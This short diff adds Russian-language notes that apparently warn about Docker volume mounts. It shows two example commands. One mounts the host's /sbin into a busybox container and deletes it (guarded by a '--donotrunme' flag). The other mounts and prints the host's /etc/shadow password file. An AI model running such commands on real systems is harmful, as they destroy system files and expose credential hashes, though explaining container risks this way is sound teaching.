@@ -1,0 +1,7 @@
+
+удалит все файлы на локальном пк (--donotrunme - для блокировки)
+$ docker run --donotrunme -v /sbin:/sbin busybox rm -rf /sbin
+
+
+покажет пароль из хост-системы
+$ docker run -v /etc/shadow:/etc/shadow busybox cat /etc/shadow
